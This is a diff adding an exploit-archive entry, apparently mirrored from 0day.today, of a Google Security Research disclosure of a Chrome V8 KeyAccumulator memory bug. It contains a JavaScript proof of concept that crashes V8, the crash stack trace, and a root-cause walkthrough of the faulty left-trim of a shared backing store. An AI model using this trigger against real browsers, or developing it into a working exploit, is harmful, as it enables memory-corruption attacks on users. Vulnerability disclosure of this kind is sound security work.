@@ -1,0 +1,59 @@
+id: 30709
+date: 07/12/2018
+title: Chrome V8 KeyAccumulator Bug Exploit
+author: Google Security Research
+cves: 
+
+Chrome: V8: A bug with KeyAccumulator 
+
+
+
+
+PoC:
+for (let i = 0; i < 10; i++) {
+    let [tmp] = [,], arr = [...Array(9063)];
+    for (let j = 0; j < 400; j++) {
+        Reflect.ownKeys(arr).shift();
+        Array(64386);
+    }
+}
+
+Crash log:
+Received signal 11 SEGV_MAPERR 30d96df00000
+
+==== C stack trace ===============================
+
+ [0x555555f3c8f4]
+ [0x7ffff7bcb390]
+ [0x555555b48eb5]
+ [0x555555b46f0f]
+ [0x555555b0d201]
+ [0x555555b18c0e]
+ [0x555555b19286]
+ [0x555555b02119]
+ [0x555555afe9b1]
+ [0x555555afd305]
+ [0x555555b0815c]
+ [0x555555adba22]
+ [0x555555be31f9]
+ [0x555555c283f3]
+ [0x555555bc2779]
+ [0x555555a81423]
+ [0x555555bc4982]
+ [0x555555bc3c41]
+ [0x555555bc2cbb]
+ [0x555555bc24bb]
+ [0x555555bc23ec]
+ [0x55555587f644]
+ [0x37cbf798b5dd]
+[end of stack trace]
+Segmentation fault
+
+What happens here is:
+
+1. When rehashing a hash table, it stores the pointer to the new table into the old table (<a href="https://cs.chromium.org/chromium/src/v8/src/objects.cc?rcl=a2ca1996873f3ffa79d9495fb2cf4e7c0e51d9e9&l=18369" title="" class="" rel="nofollow">https://cs.chromium.org/chromium/src/v8/src/objects.cc?rcl=a2ca1996873f3ffa79d9495fb2cf4e7c0e51d9e9&l=18369</a>). The new table is directly used as the backing store of the result array of "Reflect.ownKeys(arr)".
+2. The shift method invokes the MoveElements method which invokes the Heap::LeftTrimFixedArray method when "len > JSArray::kMaxCopyElements" is fulfilled (<a href="https://cs.chromium.org/chromium/src/v8/src/elements.cc?rcl=a2ca1996873f3ffa79d9495fb2cf4e7c0e51d9e9&l=2287" title="" class="" rel="nofollow">https://cs.chromium.org/chromium/src/v8/src/elements.cc?rcl=a2ca1996873f3ffa79d9495fb2cf4e7c0e51d9e9&l=2287</a>).
+3. The Heap::LeftTrimFixedArray method cuts out the left 8 bytes (a pointer) of the backing store, and leaves a filter object (8 bytes) in there (<a href="https://cs.chromium.org/chromium/src/v8/src/heap/heap.cc?rcl=a2ca1996873f3ffa79d9495fb2cf4e7c0e51d9e9&l=2816" title="" class="" rel="nofollow">https://cs.chromium.org/chromium/src/v8/src/heap/heap.cc?rcl=a2ca1996873f3ffa79d9495fb2cf4e7c0e51d9e9&l=2816</a>). It seems this operation is performed based on the assumption that the pointer to the backing store is not held in other places. But the pointer to it was stored into the old table at 1.
+4. So the filter object created at 3 is collected from the old table when a garbage collection triggered, since the size of the filter object is 8 bytes, it hits the assertion (<a href="https://cs.chromium.org/chromium/src/v8/src/utils.h?rcl=a2ca1996873f3ffa79d9495fb2cf4e7c0e51d9e9&l=1127" title="" class="" rel="nofollow">https://cs.chromium.org/chromium/src/v8/src/utils.h?rcl=a2ca1996873f3ffa79d9495fb2cf4e7c0e51d9e9&l=1127</a>).
+
+#  0day.today [2023-03-23]  #
